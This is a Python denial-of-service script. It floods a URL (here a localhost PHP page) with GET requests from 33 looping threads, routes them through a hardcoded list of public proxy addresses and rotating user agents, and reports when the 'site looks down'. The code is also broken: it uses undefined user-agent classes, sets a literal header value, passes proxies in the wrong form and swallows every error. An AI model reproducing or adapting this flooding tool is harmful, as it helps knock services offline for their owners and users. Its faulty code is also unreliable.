#!/usr/bin/env python3
import requests
import threading
import time
import random
l = []
rl = []
def getproxies():
    prox = [
"178.62.56.172:80",
"144.217.101.245:3129",	
"159.8.114.34:25",
"169.57.157.146:25",
"182.32.163.217:9999",	
"85.15.152.39:3128",
"78.101.64.35:8080",
"95.84.145.67:8080",
"103.102.60.81:8080",
"106.104.148.208:80",
"161.202.226.194:80",
"103.56.208.89:8080",
"20.97.28.47:8080",
"94.228.192.197:8087",	
"94.141.117.1:8080",
"93.170.118.241:8080",	
"88.99.10.253:1080",
"88.99.134.61:8080",
"78.46.79.74:1080",
"198.50.163.192:3129",	
"169.57.157.148:8123",
"169.57.1.85:80	",
"169.57.1.84:80",
"169.57.157.148:8123",	
"169.57.157.148:80",
"119.81.189.194:8123",	
"119.81.71.27:80",
"31.131.67.14:8080",
"182.253.171.31:8080",	
"160.16.212.238:3128",	
"169.57.157.146:8123",	
"159.8.114.37:80",
"159.8.114.34:8123",
"161.202.226.194:8123",	
"159.8.114.37:8123"
	]
    ran = random.randint(1,34)
    return prox[ran]

def current_mil_time():
	return round(time.time() * 1000)

def current_sec_time():
	return round(time.time())

def count_resp_per_sec(time_took):
	t = current_sec_time()
	l.append({
		"time_took": time_took,
		"time_received": t,
	})
	
	for e in l:
		if current_sec_time() - e["time_received"] >= 1:
			l.remove(e)

def count_req_per_sec():
	t = current_sec_time()
	rl.append({
		"time_received": t,
	})
	
	for e in rl:
		if current_sec_time() - e["time_received"] >= 1:
			rl.remove(e)
	
message = "DoSing..."
def make_request(name):
	while True:
		count_req_per_sec()
		try:

			software_names = [SoftwareName.CHROME.value]
			operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]   
			user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=1000)
			s = current_mil_time()
			user_agent = user_agent_rotator.get_user_agents()
			headers = {'User Agent': 'user_agent'}
			proxies = getproxies()
			r = requests.get('http://localhost/rename-web.php?un=santhoshsivam',headers=headers,proxies=proxies)
			t = current_mil_time() - s
			# print("Response code from thread #{}: {} took {} ms".format(name, str(r.status_code), t))
			count_resp_per_sec(t)
		except:
			message = "DoS Successful. Site looks down for now."
		
threads = 32
i=0
while i <= threads:
	x = threading.Thread(target=make_request, args=(i,))
	print("Starting thread #{}...".format(i))
	x.start()
	i+=1
	

print("Calculating... wait for a while for it to adjust...")
while True:
	time.sleep(1)
	response_time = 0
	for e in l:
		response_time = response_time + e['time_took']
	if(len(l)) > 0:
		response_time = response_time / len(l)
	if response_time > 60000:
		message = "DoS Successful. Site looks down for now."
	else:
		message = "DoSing..."
	print("\rAverage response time: {}ms; Requests/sec: {}; Responses/sec: {}; {}".format(round(response_time, 2), len(rl), len(l), message), end=""),


		
	
